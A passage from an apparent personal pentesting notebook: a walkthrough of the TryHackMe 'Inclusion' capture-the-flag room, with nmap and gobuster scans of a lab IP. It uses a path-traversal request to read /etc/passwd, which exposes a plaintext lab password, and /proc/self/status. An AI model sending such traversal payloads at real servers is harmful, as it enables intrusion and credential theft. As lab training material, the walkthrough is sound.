&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; shell! Running getuid reveals that we’re also running as root. Ouch.&lt;/p&gt;\n&lt;p&gt;We’ll just drop to shell in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; to get the contents of /root/flag.txt.&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 3 h 7 min&lt;/p&gt;","rssInclude":true},"journals/2022-02-01":{"slug":"journals/2022-02-01","filePath":"journals/2022-02-01.md","title":"Inclusion","links":["spells/Local-file-inclusion-attacks","spells/Nmap","spells/gobuster","spells/SSH"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Inclusion” on TryHackMe\n\n\n\nThis room is intended to focus on Local file inclusion attacks, so my guess is that hitting the machine with Nmap and gobuster is probably unnecessary. But, I’m going to do it anyway, just in case.\nThe target is 10.10.0.57. The website running there is basically a shell — most of the links, including the search box, don’t work. No JavaScript is loaded. The only links that do work are the “View details” buttons underneath the bottom three articles. This calls an /article endpoint with a single parameter, name. The resulting page looks like someone just dumped a plain text file between the &lt;body/&gt; tags.\nGiven the purpose of the room, I’m going to guess they did.\nWhile it’s probably pro forma, let’s run our usual Nmap scan just in case:\nsudo nmap -v -oA inclusion -Pn -A -T4 -sS -script vuln \\\n          -p- 10.10.0.57\nThis gives the following output:\n# Nmap 7.92 scan initiated Tue Feb  1 18:58:37 2022 as: nmap -v -oA inclusion -Pn -A -T4 -sS -script vuln -p- 10.10.0.57\nPre-scan script results:\n|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)\nNmap scan report for 10.10.0.57\nHost is up (0.14s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| vulners: \n|   cpe:/a:openbsd:openssh:7.6p1: \n|     \tMSF:ILITIES/UBUNTU-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-25017/\t5.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-AIX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tEXPLOITPACK:98FE96309F9524B8C84C508837551A19\t5.8\tvulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19\t*EXPLOIT*\n|     \tEXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t5.8\tvulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t*EXPLOIT*\n|     \tEDB-ID:46516\t5.8\tvulners.com/exploitdb/EDB-ID:46516\t*EXPLOIT*\n|     \tEDB-ID:46193\t5.8\tvulners.com/exploitdb/EDB-ID:46193\t*EXPLOIT*\n|     \tCVE-2019-6111\t5.8\tvulners.com/cve/CVE-2019-6111\n|     \t1337DAY-ID-32328\t5.8\tvulners.com/zdt/1337DAY-ID-32328\t*EXPLOIT*\n|     \t1337DAY-ID-32009\t5.8\tvulners.com/zdt/1337DAY-ID-32009\t*EXPLOIT*\n|     \tSSH_ENUM\t5.0\tvulners.com/canvas/SSH_ENUM\t*EXPLOIT*\n|     \tPACKETSTORM:150621\t5.0\tvulners.com/packetstorm/PACKETSTORM:150621\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t5.0\tvulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t*EXPLOIT*\n|     \tEXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t5.0\tvulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t*EXPLOIT*\n|     \tEXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t5.0\tvulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t*EXPLOIT*\n|     \tEDB-ID:45939\t5.0\tvulners.com/exploitdb/EDB-ID:45939\t*EXPLOIT*\n|     \tEDB-ID:45233\t5.0\tvulners.com/exploitdb/EDB-ID:45233\t*EXPLOIT*\n|     \tCVE-2018-15919\t5.0\tvulners.com/cve/CVE-2018-15919\n|     \tCVE-2018-15473\t5.0\tvulners.com/cve/CVE-2018-15473\n|     \t1337DAY-ID-31730\t5.0\tvulners.com/zdt/1337DAY-ID-31730\t*EXPLOIT*\n|     \tCVE-2021-41617\t4.4\tvulners.com/cve/CVE-2021-41617\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t*EXPLOIT*\n|     \tCVE-2020-14145\t4.3\tvulners.com/cve/CVE-2020-14145\n|     \tCVE-2019-6110\t4.0\tvulners.com/cve/CVE-2019-6110\n|     \tCVE-2019-6109\t4.0\tvulners.com/cve/CVE-2019-6109\n|     \tCVE-2018-20685\t2.6\tvulners.com/cve/CVE-2018-20685\n|     \tPACKETSTORM:151227\t0.0\tvulners.com/packetstorm/PACKETSTORM:151227\t*EXPLOIT*\n|_    \t1337DAY-ID-30937\t0.0\tvulners.com/zdt/1337DAY-ID-30937\t*EXPLOIT*\n80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server&#039;s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       ha.ckers.org/slowloris/\n|_      cve.mitre.org/cgi-bin/cvename.cgi\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-server-header: Werkzeug/0.16.0 Python/3.6.9\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n| http-fileupload-exploiter: \n|   \n|_    Couldn&#039;t find a file-type field.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n| vulners: \n|   cpe:/a:python:python:3.6.9: \n|     \tCVE-2021-3177\t7.5\tvulners.com/cve/CVE-2021-3177\n|     \tCVE-2020-27619\t7.5\tvulners.com/cve/CVE-2020-27619\n|     \tCVE-2020-8492\t7.1\tvulners.com/cve/CVE-2020-8492\n|     \tCVE-2020-26116\t6.4\tvulners.com/cve/CVE-2020-26116\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-16056/\t5.0\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-16056/\t*EXPLOIT*\n|     \tCVE-2019-9636\t5.0\tvulners.com/cve/CVE-2019-9636\n|     \tCVE-2019-16056\t5.0\tvulners.com/cve/CVE-2019-16056\n|     \tCVE-2018-20852\t5.0\tvulners.com/cve/CVE-2018-20852\n|     \tCVE-2018-20406\t5.0\tvulners.com/cve/CVE-2018-20406\n|     \tCVE-2018-1060\t5.0\tvulners.com/cve/CVE-2018-1060\n|     \tMSF:ILITIES/SUSE-CVE-2020-14422/\t4.3\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2020-14422/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2020-8315/\t4.3\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-8315/\t*EXPLOIT*\n|     \tCVE-2021-28359\t4.3\tvulners.com/cve/CVE-2021-28359\n|     \tCVE-2020-8315\t4.3\tvulners.com/cve/CVE-2020-8315\n|     \tCVE-2020-14422\t4.3\tvulners.com/cve/CVE-2020-14422\n|     \tCVE-2019-9947\t4.3\tvulners.com/cve/CVE-2019-9947\n|     \tCVE-2019-9740\t4.3\tvulners.com/cve/CVE-2019-9740\n|     \tCVE-2019-18348\t4.3\tvulners.com/cve/CVE-2019-18348\n|     \tCVE-2019-16935\t4.3\tvulners.com/cve/CVE-2019-16935\n|     \tCVE-2021-23336\t4.0\tvulners.com/cve/CVE-2021-23336\n|     \tMSF:ILITIES/DEBIAN-CVE-2021-3426/\t2.7\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2021-3426/\t*EXPLOIT*\n|_    \tCVE-2021-3426\t2.7\tvulners.com/cve/CVE-2021-3426\nNo exact OS matches for host (If you know what OS is running on it, see nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=2/1%OT=22%CT=1%CU=40063%PV=Y%DS=4%DC=T%G=Y%TM=61F9EB2E\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=102%TI=Z%CI=Z%TS=A)OPS(O1=M5\nOS:06ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O\nOS:6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%D\nOS:F=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0\nOS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=\nOS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%\nOS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I\nOS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nUptime guess: 48.616 days (since Wed Dec 15 04:37:20 2021)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=258 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT       ADDRESS\n1   38.25 ms  10.13.0.1\n2   ... 3\n4   170.72 ms 10.10.0.57\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\n# Nmap done at Tue Feb  1 19:23:42 2022 -- 1 IP address (1 host up) scanned in 1505.56 seconds\n\nSo, we’ve got a Linux box running SSH and some weird-ass httpd server on port 80.\nWe’ll also hit 10.10.0.57 with gobuster:\ngobuster \\\n\t-t 50 dir \\\n\t-u http://10.10.0.57 \\\n\t-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt\nThis only detects the /article endpoint I noted while poking around the site. (I could hit the site with a larger wordlist, but it doesn’t seem worth it.)\nI’m going to go out on a limb here and guess that we’re going to exploit the /article endpoint, which probably is just pulling in files verbatim.\nA common file on Linux systems is /etc/os-release, so let’s see if we can include this. And, in fact, after a little experimentation it turns out that we can using http://10.10.0.57/article?name=../../../etc/os-release:\nNAME=&quot;Ubuntu&quot;;\nVERSION=&quot;18.04.3 LTS (Bionic Beaver)&quot;;\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=&quot;Ubuntu 18.04.3 LTS&quot;;\nVERSION_ID=&quot;18.04&quot;;\nHOME_URL=&quot;www.ubuntu.com/&quot;;\nSUPPORT_URL=&quot;help.ubuntu.com/&quot;;\nBUG_REPORT_URL=&quot;bugs.launchpad.net/ubuntu/&quot;;\nPRIVACY_POLICY_URL=&quot;www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;;\nVERSION_CODENAME=bionic\nUBUNTU_CODENAME=bionic\n(It looks like /article must be doing some simple escaping too.)\nLet’s grab /etc/passwd so we know which users are running on the system.\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nfalconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash\n#falconfeast:rootpassword\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nmysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false\nI wonder who the current process is running as? /proc/self/status should have the answer.\nName:\tflask\nUmask:\t0022\nState:\tS (sleeping)\nTgid:\t567\nNgid:\t0\nPid:\t567\nPPid:\t1\nTracerPid:\t0\nUid:\t0\t0\t0\t0\nGid:\t0\t0\t0\t0\nFDSize:\t128\nGroups:\t \nNStgid:\t567\nNSpid:\t567\nNSpgid:\t567\nNSsid:\t567\nVmPeak:\t  751740 kB\nVmSize:\t  669780 kB\nVmLck:\t       0 kB\nVmPin:\t       0 kB\nVmHWM:\t   35560 kB\nVmRSS:\t   35560 kB\nRssAnon:\t   25656 kB\nRssFile:\t    9904 kB\nRssShmem:\t       0 kB\nVmData:\t   74948 kB\nVmStk:\t     132 kB\nVmExe:\t    3792 kB\nVmLib:\t    8568 kB\nVmPTE:\t     292 kB\nVmSwap:\t       0 kB\nHugetlbPages:\t       0 kB\nCoreDumping:\t0\nThreads:\t4\nSigQ:\t0/3686\nSigPnd:\t0000000000000000\nShdPnd:\t0000000000000000\nSigBlk:\t0000000000000000\nSigIgn:\t0000000001001000\nSigCgt:\t0000000180000002\nCapInh:\t0000000000000000\nCapPrm:\t0000003fffffffff\nCapEff:\t0000003fffffffff\nCapBnd:\t0000003fffffffff\nCapAmb:\t0000000000000000\nNoNewPrivs:\t0\nSeccomp:\t0\nSpeculation_Store_Bypass:\tvulnerable\nCpus_allowed:\t7fff\nCpus_allowed_list:\t0-14\nMems_allowed:\t00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001\nMems_allowed_list:\t0\nvoluntary_ctxt_switches:\t129378\nnonvoluntary_ctxt_switches:\t1378\nScore! We’re running as root. So we should be able to get our hands on anything.\nUnfortunately, it looks like neither falconfeast nor root have SSH keys (I checked for id_dsa, id_rsa, and id_id_ed25519), so we’re just going to have to blindly find the flags.\nFortunately, the flag file names are pretty standard, so finding them didn’t take long.\nElapsed Time: 56 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/inclusion&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Inclusion” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;This room is intended to focus on &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Local-file-inclusion-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Local-file-inclusion-attacks&quot;&gt;Local file inclusion attacks&lt;/a&gt;, so my guess is that hitting the machine with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; is probably unnecessary. But, I’m going to do it anyway, just in case.&lt;/p&gt;\n&lt;p&gt;The target is 10.10.0.57. The website running there is basically a shell — most of the links, including the search box, don’t work. No JavaScript is loaded. The only links that &lt;em&gt;do&lt;/em&gt; work are the “View details” buttons underneath the bottom three articles. This calls an /article endpoint with a single parameter, &lt;code&gt;name&lt;/code&gt;. The resulting page looks like someone just dumped a plain text file between the &lt;code&gt;&amp;#x3C;body/&gt;&lt;/code&gt; tags.&lt;/p&gt;\n&lt;p&gt;Given the purpose of the room, I’m going to guess they did.&lt;/p&gt;\n&lt;p&gt;While it’s probably &lt;em&gt;pro forma&lt;/em&gt;, let’s run our usual &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; scan just in case:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; inclusion&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.0.57&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This gives the following output:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Tue Feb  1 18:58:37 2022 as: nmap -v -oA inclusion -Pn -A -T4 -sS -script vuln -p- 10.10.0.57\nPre-scan script results:\n|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)\nNmap scan report for 10.10.0.57\nHost is up (0.14s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| vulners: \n|   cpe:/a:openbsd:openssh:7.6p1: \n|     \tMSF:ILITIES/UBUNTU-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-25017/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-AIX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     